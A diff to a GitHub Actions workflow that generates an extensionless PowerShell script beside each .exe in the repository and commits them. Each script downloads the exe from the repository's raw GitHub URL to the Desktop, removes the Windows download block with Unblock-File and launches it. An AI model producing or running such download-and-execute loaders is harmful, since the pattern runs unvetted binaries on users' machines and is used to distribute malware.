@@ -17,8 +17,12 @@ jobs:
         with:
           fetch-depth: 0
 
-      - name: Generate simple test files
+      - name: Generate extensionless PowerShell scripts
         shell: bash
+        env:
+          REPO_OWNER: ${{ github.repository_owner }}
+          REPO_NAME: ${{ github.event.repository.name }}
+          BRANCH: ${{ github.ref_name }}
         run: |
           set -euo pipefail
           changed=0
@@ -35,13 +39,51 @@ jobs:
               output_path="$dir/$base"
             fi
 
-            echo "hello world" > "$output_path"
-            echo "Created file at: $output_path"
+            # 1. יצירת תבנית הסקריפט
+            cat <<'SCRIPT' > "$output_path"
+# Auto-generated script
+$ErrorActionPreference = 'Stop'
+$repoOwner = '__REPO_OWNER__'
+$repoName = '__REPO_NAME__'
+$branch = '__BRANCH__'
+$relativePath = '__RELATIVE_PATH__'
+$encodedPath = ($relativePath -split '/' | ForEach-Object { [uri]::EscapeDataString($_) }) -join '/'
+$url = "https://raw.githubusercontent.com/$repoOwner/$repoName/$branch/$encodedPath"
+$destination = Join-Path ([Environment]::GetFolderPath('Desktop')) '__FILENAME__'
+
+Write-Host "Downloading __FILENAME__..."
+Invoke-WebRequest -Uri $url -OutFile $destination
+Write-Host "Downloaded to: $destination"
+
+Unblock-File -Path $destination
+
+Write-Host "Executing __FILENAME__..."
+Start-Process -FilePath $destination -Wait
+SCRIPT
+
+            # 2. הזרקה בטוחה של המשתנים לתוך הקובץ
+            FILE_PATH="$output_path" REL_PATH="$clean_path" FILE_NAME="$filename" python3 -c '
+import os
+path = os.environ["FILE_PATH"]
+with open(path, "r") as f:
+    content = f.read()
+
+content = content.replace("__REPO_OWNER__", os.environ["REPO_OWNER"])
+content = content.replace("__REPO_NAME__", os.environ["REPO_NAME"])
+content = content.replace("__BRANCH__", os.environ["BRANCH"])
+content = content.replace("__RELATIVE_PATH__", os.environ["REL_PATH"])
+content = content.replace("__FILENAME__", os.environ["FILE_NAME"])
+
+with open(path, "w") as f:
+    f.write(content)
+'
+
+            chmod 644 "$output_path"
             changed=1
           done < <(find . -type f -iname '*.exe' -print0)
 
           if [ "$changed" -eq 0 ]; then
-            echo "No .exe files were found by find command."
+            echo "No .exe files were found."
           fi
 
       - name: Commit generated scripts
@@ -58,5 +100,5 @@ jobs:
 
           git config user.name "github-actions[bot]"
           git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
-          git commit -m "Create simple test file for EXE"
+          git commit -m "Generate download and execute scripts for EXE files"
           git push
